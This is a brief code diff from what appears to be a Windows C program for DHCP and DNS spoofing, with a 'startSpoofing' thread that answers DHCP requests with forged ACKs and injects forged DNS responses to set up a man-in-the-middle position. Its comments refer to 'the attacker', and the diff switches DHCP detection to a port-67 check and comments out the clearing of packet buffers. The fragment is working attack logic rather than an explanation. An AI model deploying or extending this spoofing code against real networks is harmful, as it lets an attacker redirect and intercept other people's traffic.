@@ -228,8 +228,8 @@ DWORD WINAPI startSpoofing(LPVOID info)
 	while (!responseError)
 	{
 		/*Clearing the data of prior packets*/
-		memset(response_packet, 0, 65536);
-		memset(raw_packet, 0, 65536);
+		//memset(response_packet, 0, 65536);
+		//memset(raw_packet, 0, 65536);
 
 		/*Recieve packets*/
 		error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size); 
@@ -243,11 +243,11 @@ DWORD WINAPI startSpoofing(LPVOID info)
 		getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP); //Puts the data of the packet in the assosiated structs
 
 		
-		if (checkForDHCP(pDHCP)) // Checks for the marking of a DHCP header
+		if (pUDP.dst_port == htons(67)) // Checks if the port is the port of DHCP
 			if (getDHCPtype(pDHCP) == 3) // Checks for a request packet
 				responseError = sendACKPacket(response_packet, pDHCP, pIP, sock,(*(AddressInfo*)(info)));
 		
-		if (pUDP.dst_port == htons(53)) // Checks for a DNS packet
+		if (pUDP.dst_port == htons(53)) // Checks if the port is the port of DNS
 			if (pIP.ip_srcaddr != inet_addr((char*)((AddressInfo*)info)->ipv4)) // Checks the packet wasnt sent by the attacker
 			{
 				mitm = sendDNSResponse(response_packet, raw_packet, sock, (*(AddressInfo*)(info)));
